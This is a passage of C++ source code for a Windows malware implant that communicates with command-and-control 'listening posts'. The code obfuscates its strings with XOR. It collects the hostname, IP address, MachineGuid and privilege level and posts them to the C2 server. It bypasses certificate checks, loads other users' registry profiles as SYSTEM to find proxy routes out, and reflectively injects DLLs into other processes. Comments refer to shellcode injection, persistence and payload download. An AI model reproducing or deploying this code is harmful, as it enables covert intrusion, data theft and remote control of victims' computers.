					retInt = sendData(hConnect, L"0", (wchar_t *)pk.c_str());
				}
				else
				{
					wchar_t tmp[25];
					_itow(retInt, tmp, 10);
					//OutputDebugString(L"FAILED");
					//OutputDebugString(tmp);
					retInt = sendData(hConnect, tmp, (wchar_t *)pk.c_str());
				}
			}
			else retInt = 1;

		}
		//SHORT SLEEP
		else if(todo == 10)
		{
			try
			{
				int sleeper = _wtoi(prog.c_str());
				sleepDelay(sleeper);
				sendData(hConnect, L"0", (wchar_t *)pk.c_str());
				retInt = 999;
				
			}
			catch(...)
			{
				retInt = sendData(hConnect, L"99", (wchar_t *)pk.c_str());
			}
		}
		//MALFORMED DATA 
		else 
		{
				retInt = 10;
		}
	}
	catch(...) 
	{
		//EXCEPTION THROWN
		retInt = 10;
	}
	return retInt;
}


bool checkOS()
{
	OSVERSIONINFO osver;
	osver.dwOSVersionInfoSize = sizeof(osver);
	bool ver = 0;

	if(GetVersionEx(&osver))
	{
		//2000, XP, AND 2003
		if(osver.dwMajorVersion == 5) ver = 0;
		//VISTA AND 7
		else if(osver.dwMajorVersion == 6) ver = 1;
	}
	return ver;
}


bool checkArch()
{
	bool arch;
	
	//GET SYSTEM ARCHITECTURE
	//x86
	if(sizeof(void*) == 4) arch = 0;
	//x64
	else arch = 1;

	return arch;
}


//SET ALL POST VARIABLES THAT WILL BE USED FOR COMMS
int initializeVars()
{
	int count = 0;
	int ret = 0;
	wstring temp = L"";

	try
	{
		//CREATE ASCII CHARACTER ARRAY!
		int i = 0x00;
		while(i <= 0xff)
		{
			ASCIICHARS[i] = i;
			i++;
		}

		//SPECIAL KEY IN THE POST VARIABLE
		urlVars = L"";
		// enc=
		int enc[] = {52,63,50,108};
		urlVars.append(decryptString(enc, (sizeof(enc)/sizeof(int))));

		// 123spec!alk3y456
		int postCode[] = {96,99,98,34,33,52,50,112,48,61,58,98,40,101,100,103}; 
		urlVars.append(decryptString(postCode, (sizeof(postCode)/sizeof(int))));

		//HOSTNAME
		// &hn=
		int hn[] = {119,57,63,108};
		urlVars.append(decryptString(hn, (sizeof(hn)/sizeof(int))));
		temp = getHostName();
		urlVars.append(temp);

		//IP ADDRESS
		// &num=
		int ip[] = {119,63,36,60,108};
		urlVars.append(decryptString(ip, sizeof(ip)/sizeof(int)));

		WSADATA wsa_Data;
		int wsa_ReturnCode = WSAStartup(0x101,&wsa_Data);

		//NEXT, TO GET THE LOCAL HOST NAME
		char szHostName[255];
		gethostname(szHostName, 255);

		//WITH THIS STEP COMPLETE, ALL THAT REMAINS IS TO POPULATE A HOST ENTRY STRUCTURE WHICH WILL CONTAIN ALL THE IP RELATED INFORMATION FOR THIS MACHINE:
		struct hostent *host_entry;
		host_entry=gethostbyname(szHostName);

		//THE HOSTENT STRUCTURE IS NOT IMMEDIATELY USEFUL, HOWEVER. IT CONTAINS A LIST OF ALL THE ADAPTERS IN A MEMBER CALLED H_ADDR_LIST, WHICH IS A NULL TERMINATED LIST OF ADDRESSES. WE ASSUME THAT THE ONE WE WANT IS IN H_ADDR_LIST[0], FOR THE SAKE OF CLARITY. THIS VALUE CAN BE CONVERTED TO A STRING BY USING THE INET_NTOA FUNCTION:
		char *szLocalIP = NULL;
		szLocalIP = inet_ntoa(*(struct in_addr *)*host_entry->h_addr_list);
		
		//NOW APPEND LOCAL IP
		//CONVERT WIDE TO CHAR
		wchar_t *wszTo = NULL;
		wszTo = new wchar_t[strlen(szLocalIP) + 1];
		memset(wszTo, 0, strlen(szLocalIP) + 1);
		MultiByteToWideChar(CP_ACP, 0, szLocalIP, -1, wszTo, strlen(szLocalIP) + 1);
		urlVars.append(wszTo);
		if(wszTo) delete wszTo;

		//HAVING OBTAINED THE INFORMATION WE NEED, WE CAN NOW SHUT DOWN THE WINSOCK LIBRARY:
		WSACleanup();
		
		//IMPLANT ID
		HKEY hKey;

		//PULL OUT MACHINE ID
		hKey = regOpenKey(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Cryptography", KEY_QUERY_VALUE);

		if(hKey != NULL)
		{
			//DON'T CLEAR IT - id WILL BE HOSTNAME WITH MachineGuid APPENDED
			temp.append(regQueryValue(hKey, L"MachineGuid"));
			RegCloseKey(hKey);
		}
		else
		{
			temp.append(L"GUIDERROR");
		}

		//ID IS THE MACHINEGUID...OR THE HOSTNAME IF MACHINEGUID DOESN'T COME BACK
		// &id=
		int id[] = {119,56,53,108};
		urlVars.append(decryptString(id, (sizeof(id)/sizeof(int))));
		urlVars.append(temp);
		temp.clear();

		//RETURN PRIVILEGES
		// &pp=
		int pp[] = {119,33,33,108};
		urlVars.append(decryptString(pp, (sizeof(pp)/sizeof(int))));
		if(adminPrivs == 1) urlVars.append(L"1");
		else if(adminPrivs == 0) urlVars.append(L"0");

		//IMPLANT VERSION
		// &vn=
		int vn[] = {119,39,63,108};
		urlVars.append(decryptString(vn, (sizeof(vn)/sizeof(int))));

		//2.50
		int vnNum[] = {99,127,100,97};
		urlVars.append(decryptString(vnNum, (sizeof(vnNum)/sizeof(int))));

	}
	catch(...)
	{
		ret = 1;
	}
	return ret;
}


void runLoop()
{
	//FIND A WAY OUT!!
	//OutputDebugString(L"GET OUT!");
	WINHTTPCONNECT hConnect;

	hConnect.connectionNumber = 0; //DEFAULT TO FIRST ELEMENT IN ARRAY
	hConnect.connectionValid = false; //DEFAULT TO INVALID CONNECTION - TO SETUP INITIAL CONNECTION
	hConnect.connectionType = 0; //DEFAULT TO DIRECT CONNECTION
	hConnect.proxyConfig = L""; //INITIALIZE PROXY CONFIG
	hConnect.sUrl = L""; //INITIALIZE LP URL

	//LOOP UNTIL WE FIND A WAY OUT!
	while(true)
	{
		//FIND PROXY INFORMATION FOR CONNECTION
		if(findProxyConfig(hConnect) == true) break;

		//CONNECTION TYPE OF 5 MEANS THERE IS NO CONNECTION...KEEP LOOPING
		if(hConnect.connectionType != 5) break;
		
		//TRY THE NEXT DNS ENTRY IN THE ARRAY
		//OutputDebugString(L"TRYING NEXT DNS LP");
		hConnect.connectionNumber++;
		
		//SLEEP BEFORE NEXT ATTEMPT
		sleepDelay(DNSERROR);
	}

	//OutputDebugString(L"FOUND A WAY OUT");

	while(true)
	{
		wstring htmlKey;
		bool repeat = 0;
		int val = 0;
	
		if(RCONNECTION == 1)
		{
			//MAKE RANDOM SELECTION FROM ARRAY
			hConnect.connectionNumber = rand() % DNSARRAY;
			setupConnection(hConnect);
		}

		//RETRIVE KEY FROM HTML
		htmlKey = retrieveData(hConnect);
	
		//RETURNS -1 IF ERROR OCCURRED CONNECTING
		if(htmlKey == L"-1")
		{
			//SET CONNECTION STATUS TO FALSE
			hConnect.connectionValid = false;

			bool t = false;

			//TEST THE CONNECTION UNTIL WE GET OUT
			while(t == false)
			{	
				//TRY THE NEXT DNS ENTRY IN THE ARRAY
				//OutputDebugString(L"INCREMENTING DNSARRAY");
				hConnect.connectionNumber++;

				//RESET DNS COUNT IF WE HIT THE MAX
				if((hConnect.connectionNumber) >= DNSARRAY) 
				{
					//OutputDebugString(L"RESETTING DNSCOUNT");
					hConnect.connectionNumber = 0;
				}

				//ATTEMPTING RECONNECTION
				//OutputDebugString(L"ATTEMPTING RECONNECTION");
				//OutputDebugString(hConnect.sUrl.c_str());
				//OutputDebugString(hConnect.proxyConfig.c_str());
			
				//TEST THE NEXT DNS LP
				t = setupConnection(hConnect);
				
				//SLEEP BETWEEN EACH ATTEMPT
				sleepDelay(DNSERROR);
			}

			//SLEEP AFTER FINDING NEW DNS THAT WORKS...SO IT DOESN'T GET BURNED IMMEDIATELY
			sleepDelay(DNSERROR);

			//SET VAL TO 999 SO WE DON'T SLEEP AGAIN BELOW
			val = 999;
		}

		//PARSE THE KEY AND CARRY OUT COMMAND
		if(htmlKey.length() > 8 && htmlKey.length() < 500)
		{
			try
			{
				//SUBTRACT TO GET TO CORRECT POSITION
				int t = _wtoi(htmlKey.substr(htmlKey.length() - 3, htmlKey.length() - 2).c_str());

				//REPEAT IF MORE COMMANDS ARE QUEUED
				if(t == 1) repeat = true;
				else repeat = false;

				val = parseRequest(htmlKey, hConnect);
			}
			catch(...)
			{
				sendData(hConnect, L"10", L"EXCEPTION");
			}
		}
		
		//NO SLEEP CUZ WE JUST ITERATED THROUGH LPs WHICH TAKES A WHILE
		if(val == 999)
		{
			val = 0; 
			continue;
		}

		//NO COMMANDS LEFT, NORMAL SLEEP
		if(repeat == false) sleepDelay(DEFAULTTIMEOUT);
		
		//MORE COMMANDS, SHORT SLEEP
		else sleepDelay(SHORTTIMEOUT);
	}
}


wstring checkAutoConfigURL(HKEY hKey, LPCTSTR extraPath)
{
	HKEY keyHandle;
	wstring retString = L"";
	
	//APPEND ANY EXTRA PATH...NEEDED WHEN RUNNING AS SYSTEM AND MOUNTING THE USER PROFILE OUTSIDE THE DEFAULT LOCATION
	wstring subKey = extraPath;
	if(wcslen(extraPath) > 1) subKey.append(L"\\");

	// Software\Microsoft\Windows\CurrentVersion\Internet Settings
	int subKeyCode[] = {2,62,55,37,38,48,35,52,13,28,56,50,35,62,34,62,55,37,13,6,56,63,53,62,38,34,13,18,36,35,35,52,63,37,7,52,35,34,56,62,63,13,24,63,37,52,35,63,52,37,113,2,52,37,37,56,63,54,34};
	subKey.append(decryptString(subKeyCode, (sizeof(subKeyCode)/sizeof(int))));
	
	// AutoConfigURL
	int autoConfigURLCode[] = {16,36,37,62,18,62,63,55,56,54,4,3,29};
	wstring autoConfigURL = decryptString(autoConfigURLCode, (sizeof(autoConfigURLCode)/sizeof(int)));

	//OPEN PROXY REGISTRY KEYS
	keyHandle = regOpenKey(hKey, subKey.c_str(), KEY_QUERY_VALUE);

	if(keyHandle != NULL)
	{
		//PULL OUT AUTO CONFIG URL AND RETURN IT
		retString = regQueryValue(keyHandle, autoConfigURL.c_str());
		RegCloseKey(keyHandle);
	}

	return retString;
}


wstring checkProxyEnable(HKEY hKey, LPCTSTR extraPath)
{
	HKEY keyHandle;
	wstring retString = L"";

	//APPEND ANY EXTRA PATH...NEEDED WHEN RUNNING AS SYSTEM AND MOUNTING THE USER PROFILE OUTSIDE THE DEFAULT LOCATION
	wstring subKey = extraPath;
	if(wcslen(extraPath) > 1) subKey.append(L"\\");

	// Software\Microsoft\Windows\CurrentVersion\Internet Settings
	int subKeyCode[] = {2,62,55,37,38,48,35,52,13,28,56,50,35,62,34,62,55,37,13,6,56,63,53,62,38,34,13,18,36,35,35,52,63,37,7,52,35,34,56,62,63,13,24,63,37,52,35,63,52,37,113,2,52,37,37,56,63,54,34};
	subKey.append(decryptString(subKeyCode, (sizeof(subKeyCode)/sizeof(int))));

	// ProxyEnable
	int proxyEnableCode[] = {1,35,62,41,40,20,63,48,51,61,52};
	wstring proxyEnable = decryptString(proxyEnableCode, (sizeof(proxyEnableCode)/sizeof(int)));

	keyHandle = regOpenKey(hKey, subKey.c_str(), KEY_QUERY_VALUE);

	if(keyHandle != NULL)
	{
		DWORD peType;
		DWORD peSize = sizeof(DWORD);
		DWORD peData;

		//CHECK IF PROXY IS ENABLED
		if(RegQueryValueEx(keyHandle, proxyEnable.c_str(), 0, &peType, (LPBYTE)&peData, &peSize) == ERROR_SUCCESS)
		{
			//PROXY IS ENABLED! GRAB SETTINGS!
			if(peData == 1)
			{
				// ProxyServer
				int proxyServerCode[] = {1,35,62,41,40,2,52,35,39,52,35};
				wstring proxyServer = decryptString(proxyServerCode, (sizeof(proxyServerCode)/sizeof(int)));

				//PULL OUT PROXY SETTINGS
				retString = regQueryValue(keyHandle, proxyServer.c_str());
			}
		}
		RegCloseKey(keyHandle);
	}
	//PROXY IS NOT ENABLED OR UNABLE TO RETRIEVE SETTINGS
	return retString;
}


bool testConnection(WINHTTPCONNECT &hConnect)
{
	//ATTEMPT HTTPS CONNECTION FIRST
	WinHttpClient hClient(hConnect.sUrl);
	
	//INCLUDE NO CACHE HEADERS SO PROXY SERVER DOESN'T RETURN CACHED CONTENT
	hClient.SetAdditionalRequestHeaders(L"Pragma: no-cache\r\n");

	//DON'T REQUIRE VALID CERT
	hClient.SetRequireValidSslCertificates(false);

	//SET PROXY CONFIGURATION
	setProxyConfig(hClient, hConnect);

	//OutputDebugString(L"ATTEMPTING TO CONTACT LP");
	//OutputDebugString(hConnect.sUrl.c_str());

	//ATTEMPT TO GET OUT
	hClient.SendHttpRequest();
	
	//IF CONTENT SIZE IS > 0 THEN IT WORKS!
	if(hClient.m_statusCode == L"200" || hClient.m_statusCode == L"403")
	{
		//OutputDebugString(L"CONNECTION TO LP SUCCESSFUL");
		hConnect.connectionValid = true;
		return true;
	}
	else
	{
		//OutputDebugString(L"STATUS NOT 200");
		//OutputDebugString(hClient.m_statusCode.c_str());
	}

	/*
	if(hClient.m_statusCode == L"401")
	{
		//OutputDebugString(L"SETTING AUTOLOGON POLICY AND RETRYING");
		WinHttpSetOption(hClient.m_sessionHandle, WINHTTP_OPTION_AUTOLOGON_POLICY, (LPVOID)WINHTTP_AUTOLOGON_SECURITY_LEVEL_LOW, sizeof(int));
		hClient.SendHttpRequest();
		if(hClient.m_statusCode == L"200") 
		{
			//OutputDebugString(L"IT WORKS...ROCK ON!");
			hConnect.connectionValid = true;
		}
		else
		{
			//OutputDebugString(L"STILL FAILED! I SUCK AGAIN!");
		}
	}
	*/
	
	return false;
}


bool setupConnection(WINHTTPCONNECT &hConnect)
{
	//SETUP LP URL
	hConnect.sUrl = decryptString(DNSCODE[hConnect.connectionNumber], (sizeof(DNSCODE[hConnect.connectionNumber])/sizeof(int)));

	//IF THE CONNECTION IS NOT CURRENTLY VALID, THEN LET'S TEST THE NEW ONE
	if(hConnect.connectionValid == false) 
	{
		if(testConnection(hConnect) == true) return true;
	}
	//IF THE CONNECTION IS CURRENTLY VALID THEN WE'RE USING RANDOM LP SELECTION...JUST USE FIRST LP AND MOVE ON
	else 
	{
		return true;
	}

	return false;

	/*
	int count = 0;

	while(count < 2)
	{
		if(PCONNECTION == 0 && count == 0 || PCONNECTION == 1 && count == 1)
		{
			//SETUP THE HTTP URL
			// http://
			int httpAddrCode[] = {57,37,37,33,107,126,126};

			//SETUP THE HTTP URL
			hConnect.sUrl = decryptString(httpAddrCode, (sizeof(httpAddrCode)/sizeof(int)));
			hConnect.sUrl.append(decryptString(DNSCODE[hConnect.connectionNumber], (sizeof(DNSCODE[hConnect.connectionNumber])/sizeof(int))).c_str());
			hConnect.sUrl.append(L":");
			hConnect.sUrl.append(decryptString(HTTPCODE, (sizeof(HTTPCODE)/sizeof(int))));
		}
		else
		{
			//SETUP THE HTTPS URL
			// https://
			int httpsAddrCode[] = {57,37,37,33,34,107,126,126};
		
			//SETUP THE HTTPS URL
			hConnect.sUrl = decryptString(httpsAddrCode, (sizeof(httpsAddrCode)/sizeof(int)));
			hConnect.sUrl.append(decryptString(DNSCODE[hConnect.connectionNumber], (sizeof(DNSCODE[hConnect.connectionNumber])/sizeof(int))).c_str());
			hConnect.sUrl.append(L":");
			hConnect.sUrl.append(decryptString(HTTPSCODE, (sizeof(HTTPSCODE)/sizeof(int))));
		}

		//IF THE CONNECTION IS NOT CURRENTLY VALID, THEN LET'S TEST THE NEW ONE
		if(hConnect.connectionValid == false) 
		{
			if(testConnection(hConnect) == true) return true;
		}
		//IF THE CONNECTION IS CURRENTLY VALID THEN WE'RE USING RANDOM LP SELECTION...JUST USE FIRST LP AND MOVE ON
		else 
		{
			return true;
		}

		count++;
	}
	
	//IF NEITHER WORKED, THEN RETURN FALSE
	return false;
	**/
}


//REFLECTIVELY LOAD IN-MEMORY DLL
DWORD runReflector(BYTE *dll, DWORD dllLen, DWORD tPid)
{
	DWORD pid;
	//DWORD tid;
	DWORD dwResult = 0;
	HANDLE hProcess = NULL;
	HANDLE tdHandle = NULL;
	HANDLE hModule = NULL;
	//BYTE bMessage[32] = {0};
	DWORD dwBytes = 0;
	//remote->command = "0";

	do
	{
		//NOW LOAD THE DLL
		//pid = FindPid("spoolsv.exe");
		//if(remote->taskInt == 20) pid = GetCurrentProcessId();
		//else pid = FindPid(remote->taskCommand);
		//OutputDebugString(remote->taskCommand);
		//pid = FindPid(remote->taskCommand);
		pid = tPid;
		
		if(pid == 0) { dwResult = 1; break; }

		hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, pid);
		if(!hProcess)
		{
			dwResult = 3;
			break;
		}

		//OutputDebugString(L"RUNNING LoadRemoteLibraryR");
		//char *test = "HELLO?!?!?!";
		hModule = LoadRemoteLibraryR(hProcess, dll, dllLen, 0);
		if(!hModule) 
		{
			dwResult = 4;
			break;
		}

		//remote->command = "0";

	}while(0);

	//OutputDebugString("ALL DONE!!!");
	
	if(hProcess) CloseHandle(hProcess);
	if(hModule) CloseHandle(hModule);

	return dwResult;
}


//RETURNS A HANDLE TO REGISTRY LOCATION
HKEY regOpenKey(HKEY hKey, LPCTSTR subKey, REGSAM dPriv)
{
	HKEY rHandle;
	if(RegOpenKeyEx(hKey, subKey, 0, dPriv, &rHandle) == ERROR_SUCCESS) return rHandle;
	else return NULL;
}


//RETURNS ONLY STRING REGISTRY VALUES
wstring regQueryValue(HKEY hKey, LPCTSTR valueName)
{
	wchar_t data[255] = L"";
	DWORD dataSize = 255;

	if(RegQueryValueEx(hKey, valueName, NULL, NULL, (LPBYTE)data, &dataSize) == ERROR_SUCCESS) return data;
	else return L"";
}


bool findProxyConfig(WINHTTPCONNECT &hConnect)
{
//FORCE TESTING THE PROXY ON DEBUG
#ifndef DEBUGPROXY
	//ATTEMPT NORMAL CONNECTION FIRST
	//OutputDebugString(L"ATTEMPTING DIRECT CONNECTION");
	if(setupConnection(hConnect)) return true; 
#endif

	//RUNNING AS USER
	//ACCESS REGISTRY DIRECTLY FOR PROXY SETTINGS
	if(adminPrivs == 0)
	{
		//OutputDebugString(L"RUNNING AS USER");
		wstring t = checkProxyEnable(HKEY_CURRENT_USER, L"");
		
		//PROXY IS ENABLED, SO RETURN PROXYSERVER:PORT
		if(t.length() > 1)
		{
			//OutputDebugString(L"FOUND IP PROXY");

			//RETURN PROXY ADDRESS AND CONNECTION TYPE OF 1 = PROXY:PORT
			hConnect.proxyConfig = t;
			hConnect.connectionType = 1;
			
			//OutputDebugString(t.c_str());
			
			if(setupConnection(hConnect)) return true;
		}

		//PROXY NOT ENABLED SO TRY AutoConfigURL
		t = checkAutoConfigURL(HKEY_CURRENT_USER, L"");
			
		//AUTOCONFIGURL IS ENABLED SO RETURN THE URL
		if(t.length() > 1)
		{
			//OutputDebugString(L"FOUND URL PROXY");

			//RETURN PROXY ADDRESS AND CONNECTION TYPE OF 2 = WPAD URL
			hConnect.proxyConfig = t;
			hConnect.connectionType = 2;

			//OutputDebugString(t.c_str());
			if(setupConnection(hConnect)) return true;
		}
	}
	//RUNNING AS SYSTEM
	//HAVE TO LOAD USER PROFILE
	//IT'S THE BEST/MOST COVERT I CAN FIND
	else
	{
		HKEY keyHandle;

		//OutputDebugString(L"RUNNING AS SYSTEM");

		// SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList
		int profileListCode[] = {2,30,23,5,6,16,3,20,13,28,56,50,35,62,34,62,55,37,13,6,56,63,53,62,38,34,113,31,5,13,18,36,35,35,52,63,37,7,52,35,34,56,62,63,13,1,35,62,55,56,61,52,29,56,34,37};
		wstring profileList = decryptString(profileListCode, (sizeof(profileListCode)/sizeof(int)));
		
		//GRAB A HANDLE TO THE PROFILE LIST
		keyHandle = regOpenKey(HKEY_LOCAL_MACHINE, profileList.c_str(), KEY_READ);
		//OutputDebugString(L"FINDING PROFILES");
		//OutputDebugString(profileList.c_str());

		if(keyHandle != NULL)
		{
			int dIndex = 0;
			wchar_t subKey[255];
			DWORD subKeySize = 255;

			//OutputDebugString(L"LOOPING THROUGH PROFILES");

			//FIRST METHOD TO GET OUT IS ATTEMPT TO LOAD USER PROFILES AND FIND ONE WITH PROXY SETTINGS
			//ONLY WORKS ON XP BECAUSE 7 SEPARATES SYSTEM PRIVS AND USER PRIVS 
			//LOOP THROUGH PROFILE LIST REG KEYS TO FIND A VALID USER TO LOAD THEIR PROFILE FROM HKEY_USERS	
			while(RegEnumKeyEx(keyHandle, dIndex, subKey, &subKeySize, NULL, NULL, NULL, NULL) == ERROR_SUCCESS)
			{
				wstring temp = profileList;
				temp.append(L"\\");
				temp.append(subKey);

				//OutputDebugString(subKey);

				HKEY keyHandle1 = regOpenKey(HKEY_LOCAL_MACHINE, temp.c_str(), KEY_READ);
				if(keyHandle1 != NULL)
				{	
					//FIND USER PROFILE PATH
					// ProfileImagePath
					int profilePathCode[] = {1,35,62,55,56,61,52,24,60,48,54,52,1,48,37,57};
					wstring profilePath = decryptString(profilePathCode, (sizeof(profilePathCode)/sizeof(int)));

					//PULL OUT THE USER PROFILE PATH - WHAT WE'RE REALLY AFTER
					wstring userProfilePath = regQueryValue(keyHandle1, profilePath.c_str());

					// \ntuser.dat
					int ntUserDatCode[] = {13,63,37,36,34,52,35,127,53,48,37};
					userProfilePath.append(decryptString(ntUserDatCode, (sizeof(ntUserDatCode)/sizeof(int))));
					
					//GETTING PERMISSIONS REQUIRED TO LOAD USER PROFILE
					enableSEPrivilege(SE_RESTORE_NAME);
					enableSEPrivilege(SE_BACKUP_NAME);

					//STUPID WINDOWS...SOMETIMES USES ENV VARIABLE %systemdrive% AND SOMETIMES NOT...WTF?
					if(userProfilePath.find(L"%") != -1)
					{
						wchar_t *aTmp = new wchar_t[userProfilePath.length()+128];
						ExpandEnvironmentStrings(userProfilePath.c_str(), aTmp, userProfilePath.length()+128);
						userProfilePath.clear();
						userProfilePath = aTmp;
						delete[] aTmp;
						//OutputDebugString(L"EXPANDED ENV VARIABLE");
					}

					//OutputDebugString(L"ATTEMPTING TO LOAD PROFILE");
					//OutputDebugString(userProfilePath.c_str());
					bool isProfileLoaded = false;

					//ATTEMPT TO LOAD THE USER PROFILE
					//THIS WILL FAIL ON VISTA/7...WHICH IS WHY IT ONLY WORKS AFTER A USER LOGS IN
					if(RegLoadKey(HKEY_USERS, subKey, userProfilePath.c_str()) == ERROR_SUCCESS) 
					{
						isProfileLoaded = true; 
						//OutputDebugString(L"LOADED USER PROFILE");
					}
#ifdef _DEBUG	
					else
					{
						//PRINT DEBUG INFO IF PROFILE FAILS TO LOAD
						//OutputDebugString(L"UNABLE TO LOAD USER PROFILE");
						wchar_t tmp[25];
						DWORD retInt = GetLastError();
						_itow(retInt, tmp, 10);
						//OutputDebugString(tmp);
					}
#endif
							
					//CHECK HKEY_USER SUBKEY FOR IP PROXY
					wstring t = checkProxyEnable(HKEY_USERS, subKey);

					if(t.length() > 1)
					{
						//RETURN PROXY ADDRESS AND CONNECTION TYPE OF 3 = PROXY:PORT
						//OutputDebugString(L"FOUND IP PROXY");
						hConnect.proxyConfig = t;
						hConnect.connectionType = 3;

						//OutputDebugString(t.c_str());

						//IF true IS RETURNED, THEN UNLOAD PROFILE AND RETURN PROXY STRUCT
						if(setupConnection(hConnect)) 
						{
							if(isProfileLoaded) RegUnLoadKey(HKEY_USERS, subKey); 
							return true;
						}
					}
						
					//CHECK HKEY_USER SUBKEY FOR URL PROXY
					t = checkAutoConfigURL(HKEY_USERS, subKey);
			
					//AUTOCONFIGURL IS ENABLED SO RETURN THE URL
					if(t.length() > 1)
					{
						//OutputDebugString(L"FOUND URL PROXY");

						//RETURN PROXY ADDRESS AND CONNECTION TYPE OF 4 = WPAD URL
						hConnect.proxyConfig = t;
						hConnect.connectionType = 4;

						//OutputDebugString(t.c_str());
									
						//IF true IS RETURNED, THEN UNLOAD PROFILE AND RETURN PROXY STRUCT
						if(setupConnection(hConnect)) 
						{
							if(isProfileLoaded) RegUnLoadKey(HKEY_USERS, subKey); 
							return true;
						}
					}

					//UNLOAD PROFILE IF LOADED
					if(isProfileLoaded) RegUnLoadKey(HKEY_USERS, subKey); 

					//CLOSE KEY HANDLE
					RegCloseKey(keyHandle1);
				}
				
				//RESET ALL SUBKEYS FOR LOOP
				subKey[0] = '\0';
				subKeySize = 255;
				dIndex++;
			}

			RegCloseKey(keyHandle);
		}
#ifdef DEBUG
		else 
		{
			//OutputDebugString(L"PROFILE REGISTRY HANDLE IS NULL!");
			//PRINT DEBUG INFO IF UNABLE TO GET PRIVS
			wchar_t tmp[25];
			DWORD retInt = GetLastError();
			_itow(retInt, tmp, 10);
			//OutputDebugString(tmp);
		}
#endif
	}

	//UH OH...NO CONNECTION
	//OutputDebugString(L"DIDN'T GET OUT");

	//CONNECTION TYPE OF 5 = NO CONNECTION
	hConnect.connectionType = 5;
	return false;
}


//99 = implant error!
//15 = operation not supported
//14 = failed to get pid of explorer.exe
//13 = failed to inject shellcode
//12 = install service failed
//11 = uninstall failed
//10 = malformed data
//9  = error creating task
//8  = created process is still running or returned no output
//7  = error encoding data
//6  = upgrade failed
//5  = failed to install persistence in the registry
//4  = failed to update callback time
//3  = download failed
//2  = dll failed to load
//1  = no key found in html
//0  = operation completed successfully


//TO DO
//1 - Add XOR Obfuscation to POST variable - DONE
//2 - Dyanmic API lookup for shellcode injection
//3 - Load EXE if exists in certain place - DONE
//4 - Remove ADMIN startup path in main.
	//- Attempt to create service...if it fails go on, if its successful start it
//5 - ACCEPT %appdata% FROM LP
